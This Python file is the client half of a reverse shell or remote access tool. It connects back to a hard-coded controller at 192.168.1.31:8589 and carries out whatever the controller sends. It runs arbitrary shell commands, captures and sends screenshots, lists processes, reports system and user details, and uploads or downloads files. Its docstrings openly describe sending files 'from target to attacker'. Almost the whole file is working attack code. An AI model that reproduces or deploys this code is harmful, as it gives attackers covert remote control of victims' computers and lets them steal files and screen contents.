import socket
from threading import Thread
from pyautogui import screenshot
from subprocess import PIPE,run
import os
from psutil import process_iter
from random import choice
from time import sleep





class Client : 

    def __init__(self) : 

        self.sock = socket.socket()
        self.ip = '192.168.1.31'
        self.port = 8589
        self.sock.connect((self.ip,self.port))


        #Call functions
        self.command()



    def command(self) : 
        'Execute command '
        #print('her')

        while True :
            response = self.sock.recv(99999)
            msg = ''
            #print(response)

            if response == b'ps' : self.all_process()
            elif response == b'pwd' : self.get_directory()
            elif response.startswith(b'cd ') : self.change_directory(response)
            elif response == b'screenshot' : self.screenshot()
            elif response.startswith(b'upload ') : self.upload(response)
            elif response.startswith(b'download ') : self.download(response)
            elif response == b'sysinfo' : self.sysinfo()
            elif response == b'close all' : self.close()
            elif len(response) > 0 : self.other_command(response)

            else : pass

    def close(self) : 

        self.sock.close()
        return True

    def sysinfo(self) : 
        'Information on the system'
        print('her man !!!')
        if os.name == 'posix' : 

            p = run('uname',shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
            data = p.stderr + p.stdout
            data = data.decode('utf8')
            msg = f'OS : {data}'
            #print(msg)
            p = run('uname -m',shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
            data = p.stderr + p.stdout
            data = data.decode('utf8')
            msg = f'{msg}Arch : {data}'
            #print(msg)
            p = run('uname -n',shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
            data = p.stderr + p.stdout
            data = data.decode('utf8')
            msg = f'{msg}Hostname : {data}'
            #print(msg)
            p = run('echo $USER',shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
            data = p.stderr + p.stdout
            data = data.decode('utf8')
            msg = f'{msg}User : {data}'
            #print(msg)

            self.sock.sendall(msg.encode())

    def other_command(self,response) :
        'all other shell command'

        print('other command function')
        p = run(response,shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
        data = p.stderr + p.stdout
        print(data)

        try : 
            if data == b'' : 
                self.sock.send(b'0')
            else : self.sock.send(data)

        except : 
            pass
    
    def upload(self,response) : 
        'Send a file from attacker to target'
        response = response.decode('utf8')

        the_file = response.split('/')
        the_file = list(the_file)
        the_file.reverse()
        the_file = the_file[0]
        print(the_file)

        f = open(f'{the_file}','wb')

        while True : 

            data = self.sock.recv(1024)
            if b'[9823 FiNI 9823]' in data :
                print('STOP')
                break
            f.write(data)

        f.close() 


    def download(self,response) : 
        'Send a file from target to attacker'

        response = response.decode('utf8')
        print(response[9:])
        the_file = response[9:]
        f = open(the_file,'rb')
        size_file = os.path.getsize(the_file)
        count = 1024

        if size_file >=1024 :
            while True : 
                data = f.read(count)
                if data == b'' : 
                    print('fini')
                    break
                self.sock.send(data)
                count+=1024
            self.sock.sendall(b'[9823 FiNI 9823]')
        
        else : 
            data = f.read()
            sleep(0.5)
            self.sock.sendall(data)
            self.sock.sendall(b'[9823 FiNI 9823]')
            


        

    def get_directory(self):
        self.sock.send(os.getcwd().encode())


    def change_directory(self,response) :
        try : 
            os.chdir(response[3:])
            self.sock.send(os.getcwd().encode())
        except : self.sock.send(b'1')



    def screenshot(self):
        'Screenshot the screen'
        aleatoire = ''.join(choice('0123456789') for x in range(6))
        myScreenshot = screenshot()
        myScreenshot.save(f'{os.getcwd()}/screen{aleatoire}.png')

        f = open(f'{os.getcwd()}/screen{aleatoire}.png','rb')
        count=1024

        while True : 
            img = f.read(count)
            if img == b'' : 
                #print('stop')
                break
            self.sock.send(img)
            count+=1024

        self.sock.send(b'[9823 FiNI 9823]')
        #os.system(f'rm {os.getcwd()}/screen{aleatoire}.png')
        #print('fini')


    def all_process(self) :
        print('In all process')
        
        lst_pid = []
        name_pid = []
        username_pid = []


        # Scrap PID
        for proc in process_iter(['pid', 'name', 'username']) : 

            proc = str(proc)
            proc = proc.split('=')
            proc = str(proc)
            proc = proc.split(',')
            
            processus = proc[1]
            processus_id = processus.split("'")[1]

            lst_pid.append(processus_id)
            #print(processus_id)

        #print(lst_pid)

        #Scrap name
        for proc2 in process_iter(['pid', 'name', 'username']) : 

            proc2 = str(proc2)
            proc2 = proc2.split(',')
            proc2 = proc2[1]
            #print(proc2)

            proc2 = proc2.split('=')
            proc2 = proc2[1]
            pid_name = proc2.split("'")[1]

            name_pid.append(pid_name)


        #Scrap username
        for proc3 in process_iter(['pid', 'name', 'username']) : 

            proc3 = str(proc3.info)
            proc3 = proc3.split('username')
            proc3 = proc3[1]
            proc3 = proc3.split(',')[0]
            proc3 = proc3.split(':')[1]
            username_id = proc3.split("'")[1]

            username_pid.append(username_id)

        msg = ''
        j = 0
        for x in lst_pid : 
            
            #print(f'{x}\t\t\t{name_pid[j]}')
            msg = msg + f'{x}\t\t\t{name_pid[j]}\n'
            j+=1

        self.sock.sendall(msg.encode())


if __name__ == '__main__' : 

    cli = Client()